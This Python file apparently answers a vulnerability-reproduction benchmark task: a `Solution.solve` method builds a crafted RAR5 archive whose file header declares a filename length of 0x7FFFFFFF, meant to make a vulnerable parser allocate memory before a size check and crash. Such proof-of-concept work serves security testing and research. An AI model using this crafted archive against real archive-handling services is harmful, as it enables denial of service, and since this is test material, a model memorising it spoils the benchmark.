import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                byte_val = n & 0x7F
                n >>= 7
                if n > 0:
                    byte_val |= 0x80
                res.append(byte_val)
            return bytes(res)

        # 1. RAR5 file signature: b"Rar!\x1a\x07\x01\x00"
        poc = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        # 2. Main Archive Header (minimal)
        # Type: 0x01 (HEAD_MAIN), Flags: 0, Archive Flags: 0
        main_header_content = vint(1) + vint(0) + vint(0)
        main_header_prefix = vint(len(main_header_content)) + main_header_content
        main_crc = zlib.crc32(main_header_prefix)
        main_block = struct.pack('<I', main_crc) + main_header_prefix
        poc += main_block

        # 3. File Header with an extremely large filename length.
        # The vulnerability is that the name size is read and used for allocation
        # before it is checked against a maximum allowed size. A very large
        # value will cause an OOM crash in a sanitized environment.
        huge_name_len = 0x7FFFFFFF

        # Construct the data part of the file header
        file_header_data = b""
        file_header_data += vint(0)  # File flags
        file_header_data += vint(0)  # Unpacked size
        file_header_data += vint(0)  # File attributes
        file_header_data += vint(0)  # Compression info: version
        file_header_data += vint(0)  # Compression info: method (store)
        file_header_data += vint(0)  # Compression info: host OS
        file_header_data += vint(huge_name_len)  # Malicious name length

        # Construct the full file header block
        # Type: 0x02 (HEAD_FILE), Flags: 0
        file_header_content = vint(2) + vint(0) + file_header_data
        file_header_prefix = vint(len(file_header_content)) + file_header_content
        file_crc = zlib.crc32(file_header_prefix)
        file_block = struct.pack('<I', file_crc) + file_header_prefix
        poc += file_block
        
        return poc